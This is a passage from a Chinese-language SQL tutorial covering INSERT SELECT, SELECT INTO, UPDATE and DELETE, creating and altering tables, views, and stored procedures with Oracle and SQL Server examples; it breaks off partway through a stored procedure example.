<h3 id="插入检索出的数据"><a href="#插入检索出的数据" class="headerlink" title="插入检索出的数据"></a>插入检索出的数据</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table1<span class="token punctuation">(</span>column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3<span class="token punctuation">)</span> <span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> table2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>提示：<strong>INSERT SELECT 中的列名</strong><br>INSERT SELECT 不要求列名匹配，DBMS 不关心 SELECT 返回的列名。它使用的是列的位置，因此 SELECT 中的第一列将用来填充表列中指定的第一列，第二列将用来填充表列中指定的第二列，依次类推。</p>
<p>提示：<strong>插入多行</strong><br>INSERT 通常只插入一行。要插入多行，必须执行多个 INSERT 语句。INSERT SELECT 是个例外，他可以用一条 INSERT 插入多行，不管 SELECT 语句返回多少行，都将被 INSERT 插入。</p>
</blockquote>
<h3 id="从一个表复制到另一个表"><a href="#从一个表复制到另一个表" class="headerlink" title="从一个表复制到另一个表"></a>从一个表复制到另一个表</h3><p>要将一个表的内容复制到一个全新的表（运行中创建的表），可以使用 SELECT INTO 语句。</p>
<blockquote>
<p>注意：<strong>DB2 不支持 SELECT INTO</strong></p>
<p>注意：<strong>有的 DBMS 可以覆盖已存在的表</strong></p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">INTO</span> table2 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>MariaDB、MySQL、Oracle、PostgreSQL 和 SQLite 语法稍有不同：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> table2 <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>SELECT INTO 注意事项</p>
<ul>
<li><p>任何 SELECT 选项和子句都可以使用，包括 WHERE 和 GROUP BY</p>
</li>
<li><p>可以利用联结从多个表插入数据</p>
</li>
<li><p>不管从多少个表中检索数据，都只能插入到一个表中</p>
</li>
</ul>
<blockquote>
<p><strong>进行表的复制</strong><br>SELECT INTO 是试验新 SQL 语句前进行表复制的好方法，在复制的数据上测试新的 SQL 代码，而不会影响实际的数据。</p>
</blockquote>
<h2 id="更新和删除数据"><a href="#更新和删除数据" class="headerlink" title="更新和删除数据"></a>更新和删除数据</h2><h3 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h3><p>更新（修改）表中的数据，可以使用 UPDATE 语句。有两种使用 UPDATE 的方式：</p>
<ul>
<li><p>更新表中特定行</p>
</li>
<li><p>更新表中所有行</p>
</li>
</ul>
<blockquote>
<p>注意：<strong>不要省略 WHERE 子句</strong><br>在使用 UPDATE 时一定要细心，因为稍不注意就会更新表中的所有行。</p>
</blockquote>
<p>UPDATE 语句组成部分：</p>
<ul>
<li><p>要更新的表</p>
</li>
<li><p>列名和它们的新值</p>
</li>
<li><p>确定要更新哪些行的过滤条件</p>
</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> table1 <span class="token keyword">SET</span> column1 <span class="token operator">=</span> <span class="token string">'foo'</span><span class="token punctuation">,</span> column2 <span class="token operator">=</span> <span class="token string">'bar'</span> <span class="token keyword">WHERE</span> column3 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>UPDATE 语句以 WHERE 子句结束，它告诉 DBMS 更新哪一行，没有 WHERE 子句，DBMS 将会用新值更新所有行。</p>
<blockquote>
<p>提示：<strong>在 UPDATE 语句中使用子查询</strong><br>UPDATE 语句中可以使用子查询，使得能用 SELECT 语句检索出的数据更新列数据。</p>
<p>提示：<strong>FROM 关键字</strong><br>有的 SQL 实现支持在 UPDATE 语句中使用 FROM 子句，用一个表的数据更新另一个表的行。</p>
</blockquote>
<p>要删除某个列的值，可以设置为 NULL（假定表定义允许 NULL 值）。这与保存空字符串不同（空字符串用’’表示，是一种值），而 NULL 表示没有值。</p>
<h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><p>从一个表中删除数据，使用 DELETE 语句。有两种使用 DELETE 的方式：</p>
<ul>
<li><p>从表中删除特定的行</p>
</li>
<li><p>从表中删除所有行</p>
</li>
</ul>
<blockquote>
<p>注意：<strong>不要省略 WHERE 子句</strong><br>在使用 DELETE 时一定要细心，因为稍不注意就会更新表中的所有行。</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column1 <span class="token operator">=</span> <span class="token string">'foo'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>若省略 WHERE 子句，将删除所有行。</p>
<blockquote>
<p>提示：<strong>友好的外键</strong><br>简单的联结两个表，只需要这两个表中有公用字段。我们也可以让 DBMS 通过外键来严格定义关系。存在外键时，DBMS 使用它们判断引用的完整性。这样做的一个好处就是 DBMS 通常可以防止删除某个关系需要用到的行。</p>
<p>提示：<strong>FROM 关键字</strong><br>在某些 SQL 实现中，跟在 DELETE 后的关键字 FROM 是可选的。但是即使不需要也最好提供这个关键字。这样做将保证 SQL 代码在 DBMS 之间的可移植性。</p>
</blockquote>
<p>DELETE 不需要列名或通配符。DELETE 删除整行而不是删除列。要删除指定的列，请使用 UPDATE 语句。</p>
<blockquote>
<p>说明：<strong>删除表的内容而不是表</strong><br>DELETE 语句从表中删除行，甚至是删除表中所有行。但是，DELETE 不删除表本身。</p>
<p>提示：<strong>更快的删除</strong><br>如果想从表中删除所有行，不要使用 DELETE。可以使用 TRUNCATE TABLE 语句，它完成相同的工作，而速度更快（因为不记录数据的变动）。</p>
</blockquote>
<p>使用 UPDATE 与 DELETE 语句时要遵循的重要原则：</p>
<ol>
<li><p>除非确实需要更新和删除每一行，否则绝对不要使用不带 WHERE 子句的 UPDATE 或 DELETE 语句</p>
</li>
<li><p>保证每个表都有主键</p>
</li>
<li><p>在使用带有 WHERE 的 UPDATE 或 DELETE 语句前，应该先用 SELECT 进行测试，保证它通过的是正确的记录，以防编写的 WHERE 子句不正确</p>
</li>
<li><p>使用强制实施完整性的数据库，这样 DBMS 将不允许删除其数据与其他表相关联的行</p>
</li>
<li><p>有的 DBMS 允许数据库管理员施加约束，防止执行不带 WHERE 子句的 UPDATE 或 DELETE 语句。若所采用的 DBMS 有这个特性，应该使用它。</p>
</li>
</ol>
<p>若 SQL 没有撤消按钮，应该非常小心地使用 UPDATE 和 DELETE，否则你会发现自己更新或删除了错误的数据。</p>
<h2 id="创建和操纵表"><a href="#创建和操纵表" class="headerlink" title="创建和操纵表"></a>创建和操纵表</h2><h3 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h3><p>SQL 不仅用于表数据操纵，还用来执行数据库和表的所有操作，包括表本身的创建和处理。</p>
<p>一般有两种创建表的方法：</p>
<ul>
<li><p>多数 DBMS 都有交互式创建和管理数据库表的工具</p>
</li>
<li><p>也可以直接使用 SQL 语句操纵</p>
</li>
</ul>
<p>用 SQL 语句创建表，可以使用 SQL 的 CREATE TABLE 语句。使用交互工具实际上也是使用 SQL 语句，这些语句不是用户编写的，交互工具会根据用户的选择自动生成并执行相应的 SQL 语句。</p>
<blockquote>
<p>提示：<strong>语法差别</strong><br>在不同的 SQL 实现中，CREATE TABLE 语句在语法上可能有所不同。</p>
</blockquote>
<p>利用 CREATE TABLE 创建表，必须给出下列信息：</p>
<ol>
<li><p>新表的名字，在关键字 CREATE TABLE 之后给出</p>
</li>
<li><p>表列的名字和定义，用逗号分隔</p>
</li>
<li><p>有的 DBMS 还要求指定表的位置</p>
</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> table1 <span class="token punctuation">(</span>
  column1 <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
  column2 <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
  column3 <span class="token keyword">DECIMAL</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
  column4 <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span> <span class="token boolean">NULL</span>，
  column5 <span class="token keyword">INTEGER</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token number">1</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这条语句在 Oracle、PostgreSQL、SQL Server、SQLite 中有效，而对于 MySQL，varchar 应替换为 text，对于 DB2，必须从最后一行去掉 NULL。</p>
<blockquote>
<p>提示：<strong>替换现有的表</strong><br>在创建新的表时，指定的表名必须不存在，否则会出错。防止意外覆盖已有的表，SQL 要求先手工删除该表，然后再重建它，而不是简单地用创建表语句覆盖它。</p>
</blockquote>
<h4 id="使用-NULL-值"><a href="#使用-NULL-值" class="headerlink" title="使用 NULL 值"></a>使用 NULL 值</h4><p>NULL 值就是没有值或缺值。允许 NULL 值的列也允许在插入行时不给出该列的值。不允许 NULL 值的列不接受没有列值的行，也就是说在插入或更新行时，该列必须有值。</p>
<p>每个表列要么是 NULL 列，要么是 NOT NULL 列，这种状态在创建时由表的定义规定。</p>
<p>NULL 为默认设置，如果不指定 NOT NULL，就认为指定的是 NULL。</p>
<blockquote>
<p>注意：<strong>指定 NULL</strong><br>在不指定 NOT NULL 时，多数 DBMS 认为指定的是 NULL，但不是所有 DBMS 都这样。有些 DBMS 要求指定关键字 NULL，如果不指定将出错。</p>
<p>提示：<strong>主键和 NULL 值</strong><br>主键是其值唯一标识表中每一行的列。只有不允许 NULL 值的列可作为主键，允许 NULL 值的列不能作为唯一标识。</p>
<p>注意：<strong>理解 NULL</strong><br>不要把 NULL 与空字符串混淆。NULL 值是没有值，不是空字符串。如果指定’’，这在 NOT NULL 列中是允许的。</p>
</blockquote>
<h4 id="指定默认值"><a href="#指定默认值" class="headerlink" title="指定默认值"></a>指定默认值</h4><p>SQL 允许指定默认值，在插入行时如果不给出值，DBMS 将自动采用默认值。默认值在 CREATE TABLE 语句的列定义中用关键字 DEFAULT 指定。</p>
<p>默认值经常用于日期或时间戳列。例如，通过指定引用系统日期的函数或变量，将系统日期作为默认日期。</p>
<p>许多数据库开发人员喜欢使用 DEFAULT 值而不是 NULL 列，对于用于计算或数据分组的列更是如此。</p>
<h3 id="更新表"><a href="#更新表" class="headerlink" title="更新表"></a>更新表</h3><p>更新表定义，可以使用 ALTER TABLE 语句。虽然所有的 DBMS 都支持 ALTER TABLE，但它们所允许更新的内容差别很大。以下是使用 ALTER TABLE 时需要考虑的点：</p>
<ul>
<li><p>理想情况下，不要在表中包含数据时对其进行更新。应该在表的设计过程中充分考虑未来可能的需求，避免今后对表的结构做大改动</p>
</li>
<li><p>所有的 DBMS 都允许给现有的表增加列，不过对所增加列的数据类型（以及 NULL 和 DEFAULT 的使用）有所限制</p>
</li>
<li><p>许多 DBMS 不允许删除或更改表中的列</p>
</li>
<li><p>多数 DBMS 允许重新命名表中的列</p>
</li>
<li><p>许多 DBMS 限制对已经填有数据的列进行更改，对未填有数据的列几乎没有限制</p>
</li>
</ul>
<p>使用 ALTER TABLE 更改表结构，必须给出下面的信息：</p>
<ul>
<li><p>在 ALTER TABLE 之后给出要更改的表名（该表必须存在，否则将出错）</p>
</li>
<li><p>列要做出哪些更改</p>
</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 新增列</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> table1 <span class="token keyword">ADD</span> column6 <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">-- 删除列</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> table1 <span class="token keyword">DROP</span> <span class="token keyword">COLUMN</span> column6<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>复杂的表结构更改一般需要手动删除过程，它有以下几个步骤：</p>
<ol>
<li><p>用新的列布局创建一个新表</p>
</li>
<li><p>使用 INSERT SELECT 语句从旧表复制数据到新表。有必要的话可以使用转换函数和计算字段</p>
</li>
<li><p>检验包含所需数据的新表</p>
</li>
<li><p>重命名旧表（如果确定旧表没用，可以删除它）</p>
</li>
<li><p>用旧表原来的名称重命名新表</p>
</li>
<li><p>根据需要，重新创建触发器、存储过程、索引和外键</p>
</li>
</ol>
<blockquote>
<p>说明：<strong>ALTER TABLE 和 SQLite</strong><br>SQLite 对使用 ALTER TABLE 执行的操作有所限制。最重要的一个限制是，它不支持使用 ALTER TABLE 定义主键和外键，这些必需在最初创建表时指定。</p>
<p>注意：<strong>小心使用 ALTER TABLE</strong><br>使用 ALTER TABLE 要极为小心，应该在进行改动前做完整的备份（表结构和数据的备份）。数据库表的更改不能撤消，如果增加了不需要的列，也许无法删除它们。类似的，如果删除了不该删除的列，可能会丢失该列中的所有数据。</p>
</blockquote>
<h3 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h3><p>删除表（删除整个表，而不是其内容）非常简单，使用 DROP TABLE 语句即可：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>删除表没有确认，也不能撤消，执行这条语句将永久删除该表。</p>
<blockquote>
<p>提示：<strong>使用关系规则防止意外删除</strong><br>许多 DBMS 允许强制实施有关规则，防止删除与其他表相关联的表。在实施这些规则时，如果对某个表发布一条 DROP TABLE 语句，且该表是某个关系的组成部分，则 DBMS 将阻止这条语句执行，直到该关系被删除为止。如果允许，应该启用这些选项，它能防止意外删除有用的表。</p>
</blockquote>
<h3 id="重命名表"><a href="#重命名表" class="headerlink" title="重命名表"></a>重命名表</h3><p>每个 DBMS 对重命名的支持有所不同。DB2、MariaDB、MySQL、Oracle 和 PostgreSQL 用户使用 RENAME 语句，SQL Server 用户使用 sp_rename 存储过程，SQLite 用户使用 ALTER TABLE 语句。所有重命名操作的基本语法都要求指定旧表名和新表名，不过各 DBMS 实现存在差异。</p>
<h2 id="使用视图"><a href="#使用视图" class="headerlink" title="使用视图"></a>使用视图</h2><p>视图是虚拟的表。与包含数据的表不一样，视图只包含使用时动态检索数据的查询。</p>
<blockquote>
<p>说明：<strong>DBMS 支持</strong><br>Access 不支持视图<br>MySQL 从版本 5 起支持视图<br>SQLite 仅支持只读视图，所以视图可以创建，可以读，但其内容不能更改<br>所有 DBMS 非常一致地支持视图创建语法</p>
</blockquote>
<p>视图的常见应用：</p>
<ul>
<li><p>重用 SQL 语句</p>
</li>
<li><p>简化复杂的 SQL 操作。在编写查询后，可以方便地重用它而不用知道其查询细节</p>
</li>
<li><p>使用表的一部分而不是整个表</p>
</li>
<li><p>保护数据。可以授予用户访问表的特定部分的权限，而不是整个表的访问权限</p>
</li>
<li><p>更改数据格式和表示。视图可以返回和底层表的表示和格式不同的数据</p>
</li>
</ul>
<p>创建视图后，可以使用与基本表相同的方式使用它们。重要的是，要知道视图仅仅是用来查看存储在别处数据的一种设施。视图本身不包含数据，因此返回的数据是从其他表中检索出来的。在添加或更改这些表中的数据时，视图将返回改变过的数据。</p>
<blockquote>
<p>注意：<strong>性能问题</strong><br>因为视图不包含数据，所以每次使用视图时，都必须处理查询执行时需要的所有检索。如果你用多个联结和过滤创建了复杂的视图或者嵌套了视图，性能可能会下降得很厉害。因此，在部署使用了大量视图的应用前，应该进行性能测试。</p>
</blockquote>
<p>视图的规则和限制：</p>
<ul>
<li><p>与表一样，视图必须唯一命名（不能给视图取与别的视图或表相同的名字）</p>
</li>
<li><p>对于可以创建的视图数目没有限制</p>
</li>
<li><p>创建视图必须具有足够的访问权限。这些权限通常由数据库管理人员授予</p>
</li>
<li><p>视图可以嵌套。即可以利用从其他视图中检索数据的查询来构造视图。所允许的嵌套层数在不同的 DBMS 中有所不同（嵌套视图可能会严重降低查询性能，因此在生产环境使用前，应该对其进行全面测试）</p>
</li>
<li><p>许多 DBMS 禁止在视图查询使用 ORDER BY 语句</p>
</li>
<li><p>有些 DBMS 要求对返回的所有列进行命名，如果列是计算字段，则需要使用别名</p>
</li>
<li><p>视图不能索引，也不能有关联的触发器或默认值</p>
</li>
<li><p>有些 DBMS 把视图作为只读的查询，这表示可以从视图检索数据，但不能将数据写回底层表</p>
</li>
<li><p>有些 DBMS 允许创建这样的视图，它不能进行导致行不再属于视图的插入或更新。例如有一个视图，只检索带有电子邮件地址的顾客。如果更新某个顾客，删除他的电子邮件地址，将使该顾客不再属于视图。这是默认行为，而且是允许的，但有的 DBMS 可能会防止这种情况发生。</p>
</li>
</ul>
<blockquote>
<p>提示：<strong>参阅具体的 DBMS 文档</strong><br>上面规则不少，而具体的 DBMS 文档很可能还包含其他规则。因此在创建视图前，有必要了解必须遵守的规定</p>
</blockquote>
<p>小结：<strong>视图提供了一种封装 SELECT 语句的层次，可用来简化数据处理，重新格式化或保护基础数据。</strong></p>
<h3 id="创建视图"><a href="#创建视图" class="headerlink" title="创建视图"></a>创建视图</h3><p>视图使用 CREATE VIEW 语句创建</p>
<blockquote>
<p>说明：<strong>视图重命名</strong><br>删除视图，可以使用 DROP 语句，其语法为 DROP VIEW viewname；覆盖或更新视图，必须先删除它，然后再重新创建。</p>
</blockquote>
<h4 id="利用视图简化复杂的联结"><a href="#利用视图简化复杂的联结" class="headerlink" title="利用视图简化复杂的联结"></a>利用视图简化复杂的联结</h4><p>一个最常见的视图应用是隐藏复杂的 SQL，这通常涉及联结。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> view1 <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> table1<span class="token punctuation">,</span> table2<span class="token punctuation">,</span> table3 <span class="token keyword">WHERE</span> table1<span class="token punctuation">.</span>column1_2 <span class="token operator">=</span> table2<span class="token punctuation">.</span>column1_2 <span class="token operator">AND</span> table2<span class="token punctuation">.</span>column2_3 <span class="token operator">=</span> table3<span class="token punctuation">.</span>column2_3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>从这个视图中获取数据：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> view1 <span class="token keyword">WHERE</span> column2 <span class="token operator">=</span> <span class="token string">'foo'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>当 DBMS 处理此查询时，它将此 WHERE 子句添加到视图查询中已有的 WHERE 子句中，以便正确过滤数据。</p>
<p>视图查询极大地简化了复杂 SQL 语句的使用。利用视图，可以一次性编写基础的 SQL，然后根据需要多次使用。</p>
<blockquote>
<p>提示：<strong>创建可重用的视图</strong><br>创建不绑定特定数据的视图是一种好办法。扩展视图的范围不仅使得它能被重用，而且可能更有用。这样做不需要创建和维护多个类似视图。</p>
</blockquote>
<h4 id="用视图重新格式化检索出的数据"><a href="#用视图重新格式化检索出的数据" class="headerlink" title="用视图重新格式化检索出的数据"></a>用视图重新格式化检索出的数据</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 使用+号</span>
<span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> view1 <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> RTRIM<span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' ('</span> <span class="token operator">+</span> RTRIM<span class="token punctuation">(</span>column2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">')'</span> <span class="token keyword">AS</span> column1_2 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span>
<span class="token comment">-- 使用||符号</span>
<span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> view1 <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> RTRIM<span class="token punctuation">(</span>column1<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">' ('</span> <span class="token operator">||</span> RTRIM<span class="token punctuation">(</span>column2<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">')'</span> <span class="token keyword">AS</span> column1_2 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="用视图过滤不想要的数据"><a href="#用视图过滤不想要的数据" class="headerlink" title="用视图过滤不想要的数据"></a>用视图过滤不想要的数据</h4><p>视图对于应用普通的 WHERE 子句也很有用。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> view1 <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3 <span class="token keyword">FROM</span> table1 <span class="token keyword">WHERE</span> column3 <span class="token operator">IS</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>说明：<strong>WHERE 子句与 WHERE 子句</strong><br>从视图检索数据时如果使用了一条 WHERE 子句，则两组子句（一组在视图中，另一组是传递给视图的）将自动组合。</p>
</blockquote>
<h4 id="使用视图与计算字段"><a href="#使用视图与计算字段" class="headerlink" title="使用视图与计算字段"></a>使用视图与计算字段</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> view1 <span class="token keyword">AS</span> <span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> column3<span class="token punctuation">,</span> column4 <span class="token operator">*</span> column5 <span class="token keyword">AS</span> column4_5 <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="使用存储过程"><a href="#使用存储过程" class="headerlink" title="使用存储过程"></a>使用存储过程</h2><p>存储过程就是为以后使用而保存的一条或多条 SQL 语句。可将其视为批文件，虽然它们的作用不仅限于批处理。</p>
<blockquote>
<p>说明：<strong>具体 DBMS 的支持</strong><br>Access 和 SQLite 不支持存储过程，MySQL5 前的版本不支持存储过程。这里仅提供 Oracle 和 SQL Server 语法。</p>
</blockquote>
<h3 id="为什么使用存储过程"><a href="#为什么使用存储过程" class="headerlink" title="为什么使用存储过程"></a>为什么使用存储过程</h3><ul>
<li><p>通过把处理封装在一个易用单元中，可以简化复杂操作。</p>
</li>
<li><p>由于不要求反复建立一系列处理步骤，因而保证了数据一致性。如果所有开发人员和应用程序都使用同一存储过程，则所使用的代码都是相同的。这一点的延伸就是防止错误。需要执行的步骤越多，出错的可能性就越大。防止错误保证了数据的一致性。</p>
</li>
<li><p>简化对变动的管理。如果表名、列名或业务逻辑有变化，那么只需要更改存储过程的代码。使用它的人员甚至不需要知道这些变化。这一点的延伸就是安全性。通过存储过程限制对基础数据的访问，减少了数据讹误的机会。</p>
</li>
<li><p>因为存储过程通常以编译过的形式存储，所以 DBMS 处理命令所需的工作量少，提高了性能。</p>
</li>
<li><p>存在一些只能用在单个请求中的 SQL 元素和特性，存储过程可以使用它们来编写更灵活、功能更强大的代码。</p>
</li>
</ul>
<p>存储过程总结下来有三个好处：简单、安全、高性能。不过也有一些缺陷：</p>
<ul>
<li><p>不同 DBMS 中语法有所不同。编写真正可移植的存储过程几乎不可能，不过存储过程的自我调用（名字与如何传参）可以保持相对可移植。因此，如果需要移植到别的 DBMS，至少客户端应用代码不需要变动。</p>
</li>
<li><p>编写存储过程比编写基本的 SQL 语句更复杂，需要更高的技能与更丰富的经验。因此，许多数据库管理员把限制存储过程的创建作为安全措施。</p>
</li>
</ul>
<h3 id="执行存储过程"><a href="#执行存储过程" class="headerlink" title="执行存储过程"></a>执行存储过程</h3><p>执行存储过程使用 EXECUTE 语句。EXECUTE 接受存储过程名与需要传递给它的任何参数。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXECUTE</span> procedure1<span class="token punctuation">(</span><span class="token string">'param1'</span><span class="token punctuation">,</span> <span class="token string">'param2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>对于具体 DBMS，可能还包括以下执行选择：</p>
<ul>
<li><p>参数可选，具有不提供参数时的默认值</p>
</li>
<li><p>不按次序给出参数，以’参数=值’的方式给出参数</p>
</li>
<li><p>输出参数，允许在存储过程正在执行的应用程序中更新所用的参数</p>
</li>
<li><p>用 SELECT 语句检索数据</p>
</li>
<li><p>返回代码，允许存储过程返回一个值到正在执行的应用程序</p>
</li>
</ul>
<h3 id="创建存储过程"><a href="#创建存储过程" class="headerlink" title="创建存储过程"></a>创建存储过程</h3><p>Oracle 示例：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建</span>
<span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> MailingListCount<span class="token punctuation">(</span>
  ListCount <span class="token keyword">OUT</span> <span class="token keyword">INTEGER</span>
<span class="token punctuation">)</span>
<span class="token operator">IS</span>
v_rows <span class="token keyword">INTEGER</span><span class="token punctuation">;</span>
<span class="token keyword">BEGIN</span>
  <span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">INTO</span> v_rows
  <span class="token keyword">FROM</span> Customers
  <span class="token keyword">WHERE</span> <span class="token operator">NOT</span> cust_email <span class="token operator">IS</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span>
  ListCount :<span class="token operator">=</span> v_rows<span class="token punctuation">;</span>
<span class="token keyword">END</span><span class="token punctuation">;</span>
<span class="token comment">-- ListCount参数从存储过程中返回一个值，而不是传递一个值给存储过程，关键字OUT指示这种行为。存储过程代码包括在BEGIN、END关键字中</span>
<span class="token comment">-- 调用</span>
var ReturnValue NUMBER
<span class="token keyword">EXEC</span> MailingListCount<span class="token punctuation">(</span>:ReturnValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> ReturnValue<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>SQL Server 示例：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 创建</span>
<span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> MailingListCount
<span class="token keyword">AS</span>
<span class="token keyword">DECLARE</span> <span class="token variable">@cnt</span> <span class="token keyword">INTEGER</span>
<span class="token keyword">SELECT</span> <span class="token variable">@cnt</span> <span class="token operator">=</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span>
<span class="token keyword">FROM</span> Customers
<span class="token keyword">WHERE</span> <span class="token operator">NOT</span> cust_email <span class="token operator">IS</span> <span class="token boolean">NULL</span><span class="token punctuation">;</span>
<span class="token keyword">RETURN</span> <span class="token variable">@cnt</span><span class="token punctuation">;</span>
<span class="token comment">-- DECLARE声明名为@cnt的局部变量（局部变量以@开头）</span>
<span class="token comment">-- 调用</span>
<span class="token keyword">DECLARE</span> <span class="token variable">@ReturnValue</span> <span class="token keyword">INT</span>
<span class="token keyword">EXECUTE</span> <span class="token variable">@ReturnValue</span><span class="token operator">=</span>MailingListCount<span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> <span class="token variable">@ReturnValue</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> NewOrder <span class="token variable">@cust_id</span> <span class="token keyword">CHAR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
<span class="token keyword">AS</span>
<span class="token comment">-- Declare variable for order number</span>
<span class="token keyword">DECLARE</span> <span class="token variable">@order_num</span> <span class="token keyword">INTEGER</span>
<span class="token comment">-- Get current highest order number</span>
